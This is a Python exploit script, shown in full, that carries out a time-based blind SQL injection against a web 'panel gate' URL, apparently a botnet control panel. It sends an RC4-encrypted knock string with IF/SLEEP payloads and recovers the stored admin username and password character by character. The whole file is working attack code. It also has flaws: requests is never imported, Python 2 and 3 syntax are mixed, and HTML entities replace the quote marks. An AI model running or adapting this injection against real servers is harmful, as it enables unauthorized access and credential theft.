import time
import sys
 
wait_delay = 5 #Depending on connection delay and server speed, you may need to make this a larger number
KnockString = &#039;g=a&w=a&b=a&d=a&p=a&m=a&#039; #lol no integrity verification
 
PostData = ""
 
def rc4_crypt(data , key):
		S = list(range(256))
		j = 0
		out = []
 
		for i in range(256):
				j = (j + S[i] + ord( key[i % len(key)] )) % 256
				S[i] , S[j] = S[j] , S[i]
 
		i = j = 0
		for char in data:
				i = ( i + 1 ) % 256
				j = ( j + S[i] ) % 256
				S[i] , S[j] = S[j] , S[i]
				out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))    
		return &#039;&#039;.join(out)
 
def brute_length(url, id):
		for i in range(0, 30):
				Injection = "\"&#039;, (IF(LENGTH((SELECT value FROM settings WHERE id=&#039;%d&#039;)) = %d, SLEEP(%d), 0)), &#039;a&#039;, &#039;a&#039;, &#039;a&#039;, &#039;a&#039;, &#039;a&#039;, &#039;a&#039;)-- -" % (id, i, wait_delay)
				ConnectUrl  = url + &#039;?i=&#039; + Injection
 
				start = time.time()
				r = requests.post(ConnectUrl, data=PostData, headers=&#039;&#039;)
				end = time.time()
 
				if((end - start) >= wait_delay):
						return i
					   
		return 0
	   
def brute_char(url, position, id):
		sys.stdout.write(" ")
		sys.stdout.flush()
					   
		for i in range(32, 127):
				Injection = "\"&#039;, (IF(SUBSTRING((SELECT value FROM settings WHERE id=&#039;%d&#039;), %d, 1) = BINARY CHAR(%d), SLEEP(%d), 0)), &#039;a&#039;, &#039;a&#039;, &#039;a&#039;, &#039;a&#039;, &#039;a&#039;, &#039;a&#039;)-- -" % (id, position, i, wait_delay)
				ConnectUrl  = url + &#039;?i=&#039; + Injection
			   
				sys.stdout.write("\b%c" % chr(i))
				sys.stdout.flush()
			   
				start = time.time()
				r = requests.post(ConnectUrl, data=PostData, headers=&#039;&#039;)
				end = time.time()
 
				if((end - start) >= wait_delay):
						break
 
def brute_panel(url):
		global KnockString, PostData
	   
		PostData = &#039;aaaa&#039; + rc4_crypt(KnockString, &#039;aaaa&#039;)
	   
		print"Username: ",;
		sys.stdout.flush()
		ulen = brute_length(url, 1)
	   
		for i in range(1, ulen+1):
				brute_char(url, i, 1)
 
		print"\nPassword: ",
		sys.stdout.flush()
		plen = brute_length(url, 2)
	   
		for i in range(1, plen+1):
				brute_char(url, i, 2)
		print""
 
if(len(sys.argv) >= 2):
		brute_panel(sys.argv[1])
else:
		print("enter panel gate url")

